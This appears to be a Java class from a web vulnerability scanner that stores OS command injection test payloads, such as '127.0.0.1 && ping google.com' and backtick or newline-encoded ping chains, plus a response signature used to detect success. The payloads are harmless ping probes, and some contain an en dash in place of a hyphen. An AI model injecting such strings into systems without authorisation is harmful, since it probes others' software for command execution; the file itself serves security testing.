/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template
 */
package PayloadSignature.A3Injection;

/**
 *
 * @author shacojx
 */
public class OSCommandInjection {

    private static String[] arrSigCMDi;
    private static String[] arrPayCMDi;

    public OSCommandInjection() {
        arrSigCMDi = new String[]{
            "Pinging google.com",};

        arrPayCMDi = new String[]{
            "127.0.0.1 && ping google.com",
            "127.0.0.1 || ping google.com",
            "127.0.0.1 | ping google.com",
            "|| ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &",
            "| ping –i 30 127.0.0.1 |",
            "| ping –n 30 127.0.0.1 |",
            "& ping –i 30 127.0.0.1 &",
            "& ping –n 30 127.0.0.1 &",
            "; ping 127.0.0.1 ;",
            "%0a ping –i 30 127.0.0.1 %0a",
            "` ping 127.0.0.1 `",};
    }

    public String[] getArrSigCMDi() {
        return arrSigCMDi;
    }

    public String[] getArrPayCMDi() {
        return arrPayCMDi;
    }
}
